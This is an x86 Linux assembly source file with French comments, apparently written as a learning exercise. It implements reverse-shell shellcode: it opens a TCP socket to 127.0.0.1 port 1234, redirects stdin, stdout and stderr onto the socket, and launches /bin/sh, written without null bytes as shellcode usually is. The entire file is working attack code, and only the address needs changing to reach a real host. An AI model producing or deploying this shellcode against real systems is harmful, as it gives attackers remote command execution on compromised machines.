;https://stackoverflow.com/questions/64788272/segfault-reverse-shell-in-linux-x86-asm
;nasm -f elf32 tp.asm
;ld -m elf_i386 -s -o tp tp.o


global _start

section .text
_start:


        ; Création du socket

        push 0x66               ; socketall (102)
        pop eax                 ; clean eax et mis en place socketcall(102)
        push 0x1                ; sys_socket
        pop ebx                 ; clean ebb et mis en place sys_socket (1)
        xor ecx, ecx            ; pour éviter les 0, on xor un registre avec lui-même ce qui don0
        push ecx                ; protocole 0 ce qui signifie que le protocole est défini par lae
        push ebx                ; SOCK_STREAM (1)
        push 0x2                ; AF_INET (2) signifie la prise en charge d'adresse IPV4
        mov ecx, esp            ; pointe ecx en haut de la pile
        int 0x80                ; execution

        mov edi, eax            ; move socket vers edi pour réutilisation


        ; Connection à une adresse IP et un port


        mov al, 0x66            ; socketcall (102) déplacé dans le registre al
        pop ebx                 ; (2)
        push 0x0100007F         ; sin_addr = 127.0.0.1 
        push word 0xd204        ; sin_port = 1234
        push word 0x2           ; AF_INET (2)
        mov ecx, esp            ; pointe ecx en haut de la pile
        push 0x10               ; taille de l'adresse IP
        push ecx                ; pointer vers l'adresse ip
        push edi                ; socket descripteur = permet de stocker les valeurs retournées n
        mov ecx, esp            ; pointe ecx en haut de la pile
        inc ebx                 ; SYS_CONNECT (3)
        int 0x80                ; execution


        ; STDIN, STDOUT et STDERR dans notre nouveau socket pour redirection

        xchg ebx, edi           ; save de socketfd dans ebx pour dup2. Xchg permet d'échanger lee
        ;dup 2 = créer une copie du file descriptor oldfd en utilisant le numéro spécifié dans n.
        push 0x2
        pop ecx                 ; set ecx à 0

loop:
        mov al, 0x3f            ; dup2 sys call 63 = 0x3f
        int 0x80                ; execution dup2
        dec ecx                 ; décrémentation du compteur de la loop
        jns loop                ; JNS = Jump No Sign (valeur positive) -> tant que SF n'est pas p
        ; SF = Ce flag est positionné à 1 si la dernière opération a généré un résultat négatif,.

        ; Executer /bin/sh

        xor edx, edx            ; set edx à 0
        push edx                ; NULL
        push 0x68732f2f         ; "hs//" reverse order car utilisation de little endian (2 / pou)
        push 0x6e69622f         ; "nib/" reverse order car utilisation de little endian
        mov ebx, esp            ; pointe ebx dans la stack c-a-d en haut de la pile
        mov ecx, edx            ; on met ecx à 0
        mov al, 0xb             ; execve = Oxb
        int 0x80                ; execution execve
